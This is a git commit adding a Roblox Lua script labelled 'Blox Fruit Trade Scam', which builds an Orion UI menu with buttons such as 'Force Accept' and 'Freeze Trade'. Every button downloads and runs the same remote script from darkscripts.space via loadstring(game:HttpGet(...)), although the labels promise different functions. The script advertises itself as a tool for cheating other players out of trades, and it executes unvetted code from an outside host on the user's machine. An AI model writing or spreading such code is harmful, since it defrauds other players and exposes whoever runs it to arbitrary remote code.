dff3fdc34d9c32fa986e7cbca1b242bbc13d87dd
Dekmiss59 <missyouking555@gmail.com>
2024-12-26 11:34:05 +0700

    Create BloxFruitTrade3.0.lua

---
+++ BloxFruitTrade3.0.lua
@@ -0,0 +1,66 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "Blox Fruit Trade Scam | Private 3.0", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+
+local Tab = Window:MakeTab({
+    Name = "BloxFruit",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+    Name = "Blox Fruit TRADE SCAM OP 3.0"
+}) 
+
+
+OrionLib:MakeNotification({
+    Name = "Missyou Hub",
+    Content = "missyou hub",
+    Image = "rbxassetid://4483345998",
+    Time = 5
+})
+
+
+Tab:AddButton({
+    Name = "Freeze Trade",
+    Callback = function()
+        loadstring(game:HttpGet('https://darkscripts.space/scripts/8f9b92a4-60cd-4709-a63f-e940585868c6_1182991105411780646.lua',true))()
+         end    
+})
+
+Tab:AddButton({
+    Name = "Force Accept",
+    Callback = function()
+        loadstring(game:HttpGet('https://darkscripts.space/scripts/8f9b92a4-60cd-4709-a63f-e940585868c6_1182991105411780646.lua',true))()
+         end    
+})
+
+Tab:AddButton({
+    Name = "Freeze Player (Anti Jump)",
+    Callback = function()
+        loadstring(game:HttpGet('https://darkscripts.space/scripts/8f9b92a4-60cd-4709-a63f-e940585868c6_1182991105411780646.lua',true))()
+         end    
+})
+
+Tab:AddButton({
+    Name = "Turn off the button (The other party I cant leave​ the game)",
+    Callback = function()
+        loadstring(game:HttpGet('https://darkscripts.space/scripts/8f9b92a4-60cd-4709-a63f-e940585868c6_1182991105411780646.lua',true))()
+         end    
+})
+
+local CreditTab = Window:MakeTab({
+    Name = "Credit",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+CreditTab:AddParagraph("DEKMISSYOU")
+
+OrionLib:Init()
+
+CreditTab:AddParagraph("https://discord.gg/r77t6KvNXQ")
+
+OrionLib:Init()
+
+CreditTab:AddParagraph("New Update 3.0")
+
+OrionLib:Init()
